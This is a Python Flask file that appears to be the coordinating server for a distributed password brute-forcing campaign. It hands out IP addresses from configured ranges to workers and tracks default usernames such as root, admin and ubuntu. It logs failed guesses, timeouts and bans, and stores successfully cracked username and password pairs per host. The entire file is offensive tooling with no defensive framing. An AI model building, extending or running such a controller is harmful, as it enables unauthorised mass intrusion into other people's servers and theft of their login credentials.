import logging
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

# Global variables
CREDS = {}
USERS = ["root", "admin", "ubuntu"]
NOT_PASSWORD = []
RANGE_ID = 0
RANGES = []
IPS = []
TIMEOUT = []
BAN = []


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


def save():
    data = {
        "CREDS": CREDS, "USERS": USERS, "RANGE_ID": RANGE_ID,
        "NOT_PASSWORD": NOT_PASSWORD, "RANGES": RANGES,
        "IPS": IPS, "TIMEOUT": TIMEOUT, "BAN": BAN
    }
    with open("info.json", "w") as f:
        json.dump(data, f)


def load():
    global CREDS, USERS, RANGE_ID, NOT_PASSWORD, RANGES, IPS, TIMEOUT, BAN

    with open("info.json", "r") as f:
        data = json.load(f)

    CREDS = data["CREDS"]
    USERS = data["USERS"]
    RANGE_ID = data["RANGE_ID"]
    NOT_PASSWORD = data["NOT_PASSWORD"]
    RANGES = data["RANGES"]
    IPS = data["IPS"]
    TIMEOUT = data["TIMEOUT"]
    BAN = data.get("BAN")

    return CREDS, USERS, RANGE_ID, NOT_PASSWORD, RANGES, IPS, TIMEOUT, BAN


@app.route("/target", methods=["GET"])
def get_next_target():
    global RANGE_ID
    current_ip = get_first_ip()
    next_ip = get_next_ip(current_ip)
    while next_ip in IPS:
        next_ip = get_next_ip(current_ip)

    LATEST_IP = next_ip
    IPS.append(LATEST_IP)
    save()
    return jsonify({"target_ip": LATEST_IP})


@app.route("/error", methods=["POST"])
def receive_error():
    data = request.get_json()
    target_ip = data["target_ip"]
    username = data["username"]
    guess = data["guess"]
    error = data["error"]

    with open("errors.log", "a") as f:
        f.write(json.dumps(
            {"target_ip": target_ip, "username": username, "guess": guess, "error": error}))
        print(json.dumps({"target_ip": target_ip,
              "username": username, "guess": guess, "error": error}))
    return jsonify({"s": "s"})


@app.route("/result", methods=["POST"])
def receive_result():
    data = request.get_json()
    target_ip = data["target_ip"]
    success = data["success"]
    username = data["username"]
    password = data["password"]

    if success:
        CREDS[target_ip] = {"password": password, "username": username}

    return jsonify({"message": "Result received successfully."})


@app.route("/timeout", methods=["POST"])
def receive_timeout():
    data = request.get_json()
    target_ip = data["target_ip"]

    TIMEOUT.append(target_ip)
    print({"status": "TIMEOUT", "ip": data["target_ip"]})
    return jsonify({"message": "Timeout received successfully."})


@app.route("/ban", methods=["POST"])
def receive_ban():
    data = request.get_json()
    target_ip = data["target_ip"]

    BAN.append(target_ip)
    print({"status": "TIMEOUT", "ip": data["target_ip"]})
    return jsonify({"message": "Timeout received successfully."})


def get_first_ip():
    global RANGE_ID

    ip_start, ip_end = RANGES[RANGE_ID].split("-")
    ip_start = ip_start

    return ip_start


def get_next_ip(current_ip):
    global RANGE_ID

    ip_start, ip_end = RANGES[RANGE_ID].split("-")
    ip_start = tuple(map(int, ip_start.split(".")))
    ip_end = tuple(map(int, ip_end.split(".")))

    current_ip = tuple(map(int, current_ip.split(".")))

    def increment_ip(ip):
        ip = list(ip)
        for i in range(3, -1, -1):
            if ip[i] < 255:
                ip[i] += 1
                break
            ip[i] = 0
        return tuple(ip)

    if ip_start <= current_ip <= ip_end:
        next_ip = increment_ip(current_ip)
        while next_ip <= ip_end:
            if ".".join(map(str, next_ip)) not in IPS:
                return ".".join(map(str, next_ip))
            next_ip = increment_ip(next_ip)
        RANGE_ID += 1
        save()
        return get_next_ip(current_ip)
    else:
        return "No more targets."


if __name__ == "__main__":
    CREDS, USERS, RANGE_ID, NOT_PASSWORD, RANGES, IPS, TIMEOUT, BAN = load()
    app.run(host="0.0.0.0")
